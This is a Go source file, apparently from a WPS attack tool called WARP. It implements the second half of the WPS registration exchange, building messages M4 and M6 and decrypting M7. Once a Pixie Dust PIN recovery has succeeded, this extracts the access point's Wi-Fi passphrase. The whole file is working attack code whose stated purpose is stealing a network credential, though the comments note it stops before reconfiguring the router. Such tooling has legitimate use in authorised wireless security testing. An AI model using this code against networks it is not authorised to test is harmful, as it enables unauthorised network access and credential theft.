package wps

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"errors"
	"fmt"
)

// The second half of WPS registration: M4 through M7.
//
// Pixie Dust recovers the PIN from M3 without any of this. But the PIN is not the deliverable a
// client understands - the passphrase is. Once the PIN is known, the registrar completes the
// registration protocol far enough for the access point to hand over its own configuration: the
// enrollee (the AP) proves it holds the PIN by revealing its secret nonces in M5/M7, and M7's
// encrypted settings carry the network's actual passphrase (the WSC Network Key). WARP reads it
// there and stops - it never sends M8, so it never writes a new configuration to the access point
// and nothing joins the network. This is the difference between reading a credential and using WPS.
//
// M4 = R-Hash1, R-Hash2, Encr(R-SNonce1 || KeyWrapAuth)
// M6 = Encr(R-SNonce2 || KeyWrapAuth)
// M7 (from the AP) = Encr(E-SNonce2 || the AP's SSID / auth / encr / **Network Key** / MAC)
//
// The encrypted settings are AES-128-CBC under the KeyWrapKey with a random IV prepended, and each
// carries a Key Wrap Authenticator - HMAC-AuthKey over the plaintext - so a wrong key is caught
// rather than yielding garbage.

const (
	secretNonceLen = 16 // R-S1, R-S2, E-S1, E-S2
	kwaLen         = 8  // Key Wrap Authenticator, truncated HMAC
	aesBlock       = 16
)

// keyWrapAuth is HMAC-AuthKey over the plaintext so far, truncated to 64 bits. It goes inside the
// encrypted blob so the peer can tell a correct decryption from a wrong key.
func keyWrapAuth(authKey, plain []byte) []byte {
	mac := hmac.New(sha256.New, authKey)
	mac.Write(plain)
	return mac.Sum(nil)[:kwaLen]
}

// encryptSettings AES-128-CBC encrypts a plaintext attribute blob under the KeyWrapKey and returns
// the on-wire value of an Encrypted Settings attribute: a random 16-octet IV followed by the
// ciphertext. The plaintext is PKCS#7-padded to a block boundary first (a full block of padding
// when it is already aligned, exactly as the spec requires).
func encryptSettings(keyWrapKey, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(keyWrapKey)
	if err != nil {
		return nil, fmt.Errorf("wps: AES key: %w", err)
	}
	padLen := aesBlock - len(plain)%aesBlock
	padded := make([]byte, len(plain)+padLen)
	copy(padded, plain)
	for i := len(plain); i < len(padded); i++ {
		padded[i] = byte(padLen)
	}

	out := make([]byte, aesBlock+len(padded))
	iv := out[:aesBlock]
	if _, err := rand.Read(iv); err != nil {
		return nil, fmt.Errorf("wps: settings IV: %w", err)
	}
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(out[aesBlock:], padded)
	return out, nil
}

// decryptSettings reverses encryptSettings: split the IV, AES-128-CBC decrypt, strip and validate
// the PKCS#7 padding.
func decryptSettings(keyWrapKey, encr []byte) ([]byte, error) {
	if len(encr) < 2*aesBlock || len(encr)%aesBlock != 0 {
		return nil, fmt.Errorf("wps: encrypted settings are %d octets, not a valid AES-CBC blob",
			len(encr))
	}
	block, err := aes.NewCipher(keyWrapKey)
	if err != nil {
		return nil, fmt.Errorf("wps: AES key: %w", err)
	}
	iv, ct := encr[:aesBlock], encr[aesBlock:]
	plain := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(plain, ct)

	pad := int(plain[len(plain)-1])
	if pad < 1 || pad > aesBlock || pad > len(plain) {
		return nil, errors.New("wps: encrypted settings have an invalid PKCS#7 pad")
	}
	for _, b := range plain[len(plain)-pad:] {
		if int(b) != pad {
			return nil, errors.New("wps: encrypted settings have a corrupt PKCS#7 pad")
		}
	}
	return plain[:len(plain)-pad], nil
}

// M4Options carries what M4 commits: the registrar proves it holds the PIN by binding its secret
// nonces to the two PIN halves under the shared AuthKey.
type M4Options struct {
	AuthKey       []byte
	KeyWrapKey    []byte
	EnrolleeNonce []byte
	PKE, PKR      []byte
	// PSK1, PSK2 are HMAC-AuthKey over each half of the recovered PIN.
	PSK1, PSK2 []byte
	// RS1, RS2 are the registrar's secret nonces, revealed (R-S1 now, R-S2 in M6).
	RS1, RS2 []byte
	// PreviousMessage is M3 exactly as it arrived, for the authenticator.
	PreviousMessage []byte
}

// BuildM4 assembles M4: the two R-Hash commitments and the encrypted R-SNonce1.
func BuildM4(o M4Options) ([]byte, error) {
	if len(o.RS1) != secretNonceLen || len(o.RS2) != secretNonceLen {
		return nil, fmt.Errorf("wps: M4 needs two %d-octet secret nonces", secretNonceLen)
	}
	var b []byte
	b = appendTLV8(b, attrVersion, 0x10)
	b = appendTLV8(b, attrMessageType, msgM4)
	b = appendTLV(b, attrEnrolleeNonce, o.EnrolleeNonce)
	// R-Hash1 = HMAC-AuthKey(R-S1 || PSK1 || PKE || PKR); R-Hash2 the same with R-S2/PSK2.
	b = appendTLV(b, attrRHash1, hashHalf(o.AuthKey, o.RS1, o.PSK1, o.PKE, o.PKR))
	b = appendTLV(b, attrRHash2, hashHalf(o.AuthKey, o.RS2, o.PSK2, o.PKE, o.PKR))

	var plain []byte
	plain = appendTLV(plain, attrRSNonce1, o.RS1)
	plain = appendTLV(plain, attrKeyWrapAuth, keyWrapAuth(o.AuthKey, plain))
	encr, err := encryptSettings(o.KeyWrapKey, plain)
	if err != nil {
		return nil, err
	}
	b = appendTLV(b, attrEncrSettings, encr)

	b = appendTLV(b, attrAuthenticator, authenticator(o.AuthKey, o.PreviousMessage, b))
	return b, nil
}

// M6Options carries the second registrar secret nonce, encrypted.
type M6Options struct {
	AuthKey         []byte
	KeyWrapKey      []byte
	EnrolleeNonce   []byte
	RS2             []byte
	PreviousMessage []byte // M5
}

// BuildM6 assembles M6: the encrypted R-SNonce2 that lets the enrollee open its M7 commitment.
func BuildM6(o M6Options) ([]byte, error) {
	if len(o.RS2) != secretNonceLen {
		return nil, fmt.Errorf("wps: M6 needs a %d-octet secret nonce", secretNonceLen)
	}
	var b []byte
	b = appendTLV8(b, attrVersion, 0x10)
	b = appendTLV8(b, attrMessageType, msgM6)
	b = appendTLV(b, attrEnrolleeNonce, o.EnrolleeNonce)

	var plain []byte
	plain = appendTLV(plain, attrRSNonce2, o.RS2)
	plain = appendTLV(plain, attrKeyWrapAuth, keyWrapAuth(o.AuthKey, plain))
	encr, err := encryptSettings(o.KeyWrapKey, plain)
	if err != nil {
		return nil, err
	}
	b = appendTLV(b, attrEncrSettings, encr)

	b = appendTLV(b, attrAuthenticator, authenticator(o.AuthKey, o.PreviousMessage, b))
	return b, nil
}

// APSettings is the access point's own configuration, revealed in M7 once the registrar has proven
// it holds the PIN. NetworkKey is the passphrase - the thing the whole attack is for.
type APSettings struct {
	SSID       string
	NetworkKey string
	AuthType   uint16
	EncrType   uint16
}

// ParseM7 decrypts M7's encrypted settings with the KeyWrapKey and pulls out the access point's
// configuration, above all its passphrase.
func ParseM7(b, keyWrapKey []byte) (*APSettings, error) {
	t := parseTLVs(b)
	if mt, ok := t[attrMessageType]; !ok || len(mt) != 1 || mt[0] != msgM7 {
		return nil, errors.New("wps: message is not M7")
	}
	encr, ok := t[attrEncrSettings]
	if !ok {
		return nil, errors.New("wps: M7 carries no encrypted settings")
	}
	plain, err := decryptSettings(keyWrapKey, encr)
	if err != nil {
		return nil, err
	}
	inner := parseTLVs(plain)
	key, ok := inner[attrNetworkKey]
	if !ok {
		// An AP with no passphrase (open network being configured over WPS) is legitimate but not
		// what a PSK attack expects; report it rather than a nil key.
		return nil, errors.New("wps: M7 settings carry no Network Key")
	}
	s := &APSettings{SSID: string(inner[attrSSID]), NetworkKey: string(key)}
	if v := inner[attrAuthType]; len(v) == 2 {
		s.AuthType = uint16(v[0])<<8 | uint16(v[1])
	}
	if v := inner[attrEncrType]; len(v) == 2 {
		s.EncrType = uint16(v[0])<<8 | uint16(v[1])
	}
	return s, nil
}

// newSecretNonce returns a fresh registrar secret nonce.
func newSecretNonce() ([]byte, error) {
	n := make([]byte, secretNonceLen)
	if _, err := rand.Read(n); err != nil {
		return nil, fmt.Errorf("wps: secret nonce: %w", err)
	}
	return n, nil
}
